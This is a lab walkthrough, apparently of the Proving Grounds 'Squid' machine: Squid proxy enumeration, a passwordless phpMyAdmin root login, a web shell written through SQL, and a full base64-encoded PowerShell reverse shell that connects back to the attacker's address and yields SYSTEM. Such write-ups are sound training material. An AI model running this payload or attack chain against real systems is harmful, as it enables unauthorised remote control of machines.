First start enumeration with nmap 

```
nmap -p- --min-rate 1000 -oN fulltcp.txt -v -Pn <IP>
```

```
# Nmap 7.93 scan initiated Thu Jan 12 17:53:21 2023 as: nmap -p- --min-rate 10000 -oN fulltcp.txt -v -Pn 192.168.184.189
Nmap scan report for 192.168.184.189
Host is up (0.22s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE
3128/tcp open  squid-http

Read data files from: /usr/bin/../share/nmap
# Nmap done at Thu Jan 12 17:55:10 2023 -- 1 IP address (1 host up) scanned in 108.98 seconds
```

we have only one port open, let run default nmap scripts to know what services is running on that port.

`nmap -sC -sV -oN normal.tcp -p 3128 -Pn <IP>`

```
# Nmap 7.93 scan initiated Thu Jan 12 17:57:11 2023 as: nmap -sC -sV -oN normal.tcp -p 3128 -Pn 192.168.184.189
Nmap scan report for 192.168.184.189
Host is up (0.22s latency).

PORT     STATE SERVICE    VERSION
3128/tcp open  http-proxy Squid http proxy 4.14
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/4.14

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jan 12 17:57:47 2023 -- 1 IP address (1 host up) scanned in 35.68 seconds
```

cool we have squid http-proxy 4.14, let's enumerate this proxy. we would be using [spose.py](https://github.com/aancw/spose). 

```
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PGP/Squid/spose]
└─$ python spose.py --proxy http://192.168.184.189:3128 --target 192.168.184.189
Using proxy address http://192.168.184.189:3128
192.168.184.189 8080 seems OPEN
```

running spose.py on the target, we can see that port 8080 is open, let's enumerate further 

![image](https://user-images.githubusercontent.com/87468669/212273874-9928f77c-9d8a-4040-a635-724480f9478c.png)

first we have to configure the web server proxy, 

![image](https://user-images.githubusercontent.com/87468669/212273950-0d52fd06-f882-4dc5-a62e-77122c987d50.png)

after configuring the proxy, opened the IP:8080 on a browser and we got a wampserver forum. navigate to the phpmyadmin section.

![image](https://user-images.githubusercontent.com/87468669/212274053-141958db-75a2-4545-96ac-8b1a2fc5ac45.png)

logged in as root without any password 

![image](https://user-images.githubusercontent.com/87468669/212274260-b647b78b-d204-447e-a6f6-a0c4053e4a75.png)

and we are able to login. now let's get a shell.

![image](https://user-images.githubusercontent.com/87468669/212274537-441e8262-710e-4f97-a07e-d113bb06c03d.png)

navigateg to the sql path, using the console tab, inject our payload into the `c:/wamp/www` directory. press ctrl+enter key to excute.

![image](https://user-images.githubusercontent.com/87468669/212274627-63eeb53f-587f-4a53-b613-93a231124882.png)

navigate to the uploaded shell path and boom we got RCE. let's get a reverse shell. reverse shell payload base64 encoding:

```
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQAOQAuADEAOAA0ACIALAAyADIAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```

![image](https://user-images.githubusercontent.com/87468669/212274832-d36e7a4c-eadd-40bb-ab56-b36b8b8b4435.png)

fire ncat listener and send the payload. check back our ncat listener 

![image](https://user-images.githubusercontent.com/87468669/212274910-2ef46828-9396-4e78-bdda-24b2f4f91b60.png)

Boom got shell as `nt authority\system` user. 

[more resource](https://topic.alibabacloud.com/a/phpmyadmin-various-tricks-to-get-webshell_1_11_30631676.html).


